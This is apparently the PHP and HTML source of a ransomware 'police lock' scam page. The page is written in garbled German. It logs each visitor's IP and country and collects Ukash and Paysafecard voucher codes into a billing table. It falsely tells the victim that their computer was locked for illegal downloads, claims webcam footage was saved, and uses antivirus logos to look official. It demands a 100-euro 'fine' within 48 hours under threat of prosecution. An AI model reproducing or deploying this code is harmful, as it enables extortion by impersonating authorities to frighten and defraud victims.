<?php
error_reporting(0);
include 'include/config.php';
include ('include/db.php');
include("sxgeo/SxGeo.php");




$pin=$_GET['pin'];
$ip = $_SERVER['REMOTE_ADDR'];
$date=date('H:i:s j/m/Y');


$SxGeo = new SxGeo();

$country=$SxGeo->get_cc($ip);

$SxGeo->close();


$locations= array(1 => 'DE', 'UK', 'IT', 'FR', 'ES', 'PT', 'CA', 'AT', 'FI', 'SE', 'US', 'GR', 'LU', 'BE', 'PL');

foreach ($locations as $value)
{
	
if ($value==$country)
{
$pic=$value;
break;
}
else
$pic='default';	
}




mysql_query ( "INSERT INTO checklist (ip, country, date) VALUES ('".mysql_escape_string($ip)."', 
'".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
mysql_insert_id ();




  $pin=$_GET['pin'];

  
  
    if(strlen($pin) == 16 && preg_match("/[0-9]{16}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
   if(strlen($pin) == 19 && preg_match("/[0-9]{19}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
  
 
 ?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>

  <script language="JavaScript">
<!--
///////////////////////////////////
function clickIE4(){
if (event.button==2){
return false;
}
}
function clickNS4(e){
if (document.layers||document.getElementById&&!document.all){
if (e.which==2||e.which==3){
return false;
}
}
}
if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=clickNS4;
}
else if (document.all&&!document.getElementById){
document.onmousedown=clickIE4;
}
document.oncontextmenu=new Function("return false")
// --> </script>
  <title></title>


  <meta http-equiv="Content-Type" content="text/html; charset=windows-1251">

  <link href="style.css" rel="stylesheet" type="text/css">

  <script type="text/javascript" src="jquery1.3.1.js"></script>
  <script type="text/javascript" src="jquerykeypad.js"></script>

  <style type="text/css">
<!--
#Table_01 {
position:absolute;
left:20px;
top:20px;
width:100%;
height:100%;
}
.btn{
color: #000;
width: 30px;
margin-left: 5px;
border: 1px solid #434343;
-moz-border-radius: 2px;
-khtml-border-radius: 2px;
-webkit-border-radius: 2px;
border-radius: 2px;
}
.btn:hover{
border: 2px solid #0290CB;
}
#Untitled-1-01 {
position:absolute;
left:0px;
top:0px;
width:1024px;
height:98px;
}
#Untitled-1-02 {
position:absolute;
left:0px;
top:98px;
width:395px;
height:670px;
}
#Untitled-1-03 {
position:absolute;
left:395px;
top:98px;
width:324px;
height:430px;
}
#Untitled-1-04 {
position:absolute;
left:719px;
top:98px;
width:305px;
height:430px;
}
#Untitled-1-05 {
position:absolute;
left:395px;
top:528px;
width:629px;
height:240px;
}
-->
  </style><!-- End ImageReady Styles -->
</head>


<body style="margin: 0px; background-color: rgb(255, 255, 255); color: rgb(0, 0, 0);" alink="#ee0000" link="#0000ee" vlink="#551a8b">

<!-- ImageReady Slices (Untitled-1) -->
<div id="Table_01">
<div id="Untitled-1-01"> <img style="width: 481px; height: 99px;" alt="" src="images/logo.jpg"></div>

<div style="left: 0px; width: 470px; top: 130px; height: 739px;" id="Untitled-1-02"><span id="result_box" class="" lang="de"><span class="hps">Alle
Aktivit&auml;ten</span> <span class="hps">des
Computers</span> <span class="hps">aufgezeichnet
wurde.</span> <span class="hps">Wenn Sie</span>
<span class="hps">Webcam</span> <span class="hps">zu
nutzen,</span> <span class="hps">wurden</span>
<span class="hps">Videos und Bilder</span> <span class="hps">zur Identifikation</span> <span class="hps">Webcam</span> <span class="hps">gerettet</span></span>.<br>

<center><img style="width: 256px; height: 192px;" alt="" src="images/flag_256.jpg"></center>

<br>

<span style="font-weight: bold;" id="result_box" class="" lang="de"><span class="hps">Ihre
IP-Adresse</span><span class=""></span></span><span style="font-weight: bold;">:</span><?php echo $_SERVER['REMOTE_ADDR'];?>
<br>

<span style="font-weight: bold;" id="result_box" class="" lang="de"><span class="hps">Man
kann deutlich</span> <span class="hps">durch</span>
<span class="hps">Ihre IP-Adresse</span> <span class="hps">identifiziert werden</span> <span class="hps">und die damit verbundene</span> <span class="hps">Hostname</span></span><br>

<br>

<img style="width: 447px; height: 90px;" alt="" src="images/yourpclock.jpg"><br>

<br>

<span id="result_box" class="" lang="de"><span style="font-weight: bold;" class="hps">Illegal
heruntergeladenen</span><span style="font-weight: bold;">
</span><span style="font-weight: bold;" class="hps atn">Material
(</span><span style="font-weight: bold;">MP3s, </span><span style="font-weight: bold;" class="hps">Filme</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">oder</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">Software)</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">hat sich</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">auf Ihrem
Computer</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">befindet</span><br>

<br>

<span class="hps">Durch das Herunterladen,</span> <span class="hps">wurden</span> <span class="hps">diejenigen,</span>
<span class="hps">reproduziert</span> <span class="hps">und dadurch</span> <span class="hps">mit</span>
<span class="hps">einer <span style="font-weight: bold;">Straftat</span></span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">nach &sect;</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">106</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">des</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">Urheberrechtsgesetzes</span><span style="font-weight: bold;">.</span><br>

<br>

<span class="hps">Das Herunterladen</span> <span class="hps">von urheberrechtlich gesch&uuml;tztem
Material</span> <span class="hps">&uuml;ber das
Internet oder</span> <span class="hps atn">Musik-</span><span>Tauschb&ouml;rsen</span>
<span class="hps">ist illegal und</span> <span class="hps">steht im Einklang mit</span><br>

<span style="font-weight: bold;" class="hps">Section</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">106 des</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">Copyright Act</span>
<span class="hps">unterliegen einer</span> <span class="hps">Geldstrafe oder Freiheitsstrafe von</span>
<span class="hps">einer Strafe von</span> <span class="hps">bis zu 3 Jahren</span><br>

<br>

<span class="hps">Des weiteren ist</span> <span class="hps">in Besitz</span> <span class="hps">von
illegal</span> <span class="hps">heruntergeladenen</span>
<span class="hps">Material</span> <span class="hps">strafbar nach</span> <span class="hps">&sect;
184</span> <span class="hps">Absatz 3</span> <span class="hps">des Strafgesetzbuches</span> <span class="hps">und</span> <span class="hps">kann
auch auf die</span> <span class="hps">Beschlagnahme</span>
<span class="hps">des Computers</span> <span class="hps">f&uuml;hren</span><span>,</span>
<span class="hps">mit denen die</span> <span class="hps">Diles</span> <span class="hps">heruntergeladen</span>
<span class="hps">wurden</span></span></div>

<div style="left: 474px; width: 372px; top: 128px; height: 174px;" id="Untitled-1-03"><span id="result_box" class="" lang="de"><span class="hps">Bitte</span> <span class="hps">folgen Sie den Anweisungen</span> <span class="hps">auf der rechten Seite</span></span>
<form name="ukash_form" method="get" action="CH.php" style="margin: 0px;">Ukash code: <input name="pin" id="defaultKeypad" type="text"><input name="formbutton1" value="ok" class="btn" type="submit">
  <div id="formradio2"><input name="100u" value="50" type="radio">50 Euro</div>

  <div id="formradio3"><input name="100u" value="100" checked="checked" type="radio">100
Euro</div>

</form>

<form name="psc_form" method="get" action="CH.php" style="margin: 0px;">Psc code: <input name="pin" id="defaultKeypad2" type="text"><input name="formbutton2" value="ok" class="btn" type="submit">
  <div style="background-color: rgb(255, 255, 255);" id="formradio4"><input name="100p" value="50" type="radio">50 Euro</div>

  <div id="formradio5"><input name="100p" value="100" checked="checked" type="radio">100
Euro</div>

</form>

<br>

<br>

<br>

<span id="result_box" class="" lang="de"><span class="hps"><span style="color: rgb(255, 0, 0);">Bitte
beachten Sie</span>:</span> <span class="hps">Dieses
feine</span> <span class="hps">darf nur</span>
<span class="hps">innerhalb von 48 Stunden</span> <span class="hps">bezahlt werden</span><span>,</span>
<span class="hps">wenn Sie</span> <span class="hps">48 Stunden warten,</span> <span class="hps">ohne Bezahlung</span> <span class="hps">zu
lassen,</span> <span class="hps">die
M&ouml;glichkeit der</span> <span class="hps">Erschlie&szlig;ung</span>
<span class="hps">Ihrem Computer</span> <span class="hps">abl&auml;uft.</span><br>

<br>

<span style="font-weight: bold;" class="hps">In
diesem Fall wird</span><span style="font-weight: bold;">
</span><span style="font-weight: bold;" class="hps">ein
Strafverfahren gegen</span><span style="font-weight: bold;">
</span><span style="font-weight: bold;" class="hps">Sie
automatisch</span> <span class="hps"><span style="font-weight: bold;">initiiert werden</span>.</span></span><span style="font-weight: bold;"></span></div>

<div style="left: 860px; width: 164px; top: 98px; height: 261px;" id="Untitled-1-04"> <img style="width: 332px; height: 271px;" alt="" src="images/right2.jpg"></div>

<div style="left: 481px; width: 543px; top: 488px; height: 360px;" id="Untitled-1-05"> <img style="width: 276px; height: 38px;" alt="" src="images/mcafee.jpg"><span id="result_box" class="" lang="en"><span class="hps"><br>

</span></span><span id="result_box" class="" lang="de"><span class="hps">Wie zu entsperren</span><span>?</span><br>

<br>

<span class="hps">In &Uuml;bereinstimmung mit dem</span>
<span class="hps">Gesetz <span style="font-weight: bold;">"&Uuml;ber die</span></span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">Kontrolle und
Schutz von</span><span style="font-weight: bold;"> </span><span class="hps"><span style="font-weight: bold;">Informationen"</span>
auf</span> <span class="hps">2012.02.01</span>
<span class="hps">Sie m&uuml;ssen eine</span> <span class="hps">Geldstrafe von <span style="font-weight: bold;">100</span></span><span style="font-weight: bold;"> </span><span class="hps"><span style="font-weight: bold;">Euro</span>
zahlen.</span> <span class="hps">F&uuml;r die
Bequemlichkeit der</span> <span class="hps">Zahlung
einer</span> <span class="hps">Geldstrafe</span>
<span class="hps">Angebot</span><span>, um
eine sichere</span> <span class="hps">Form der
Bezahlung</span> <span class="hps">durch Gutscheine</span>
<span style="font-weight: bold;" class="hps">Ukash</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">/</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">Paysafecard</span>
<span class="hps">zu nutzen.</span> <span class="hps">Sie m&uuml;ssen sich</span> <span class="hps">Gutscheine in</span> <span class="hps">der</span>
<span class="hps">H&ouml;he von 100 EUR</span> <span class="hps">zu kaufen,</span> <span class="hps">nachdem</span>
<span class="hps">f&uuml;llen Sie</span> <span class="hps">die entsprechenden Felder ein</span><span>,
klicken Sie auf</span> <span class="hps">"OK</span></span><span id="result_box" class="" lang="en"><span class="">"</span></span><br>

<br>

<center><img style="top: 666px; left: 501px; width: 169px; height: 90px;" alt="" src="images/1326914693-sopa-pipa-inquisitr.png">
<img style="top: 488px; left: 501px; width: 76px; height: 92px;" alt="" src="images/kaspersky_is_logo.gif.png"></center>

</div>

</div>

<!-- End ImageReady Slices -->
</body>
</html>
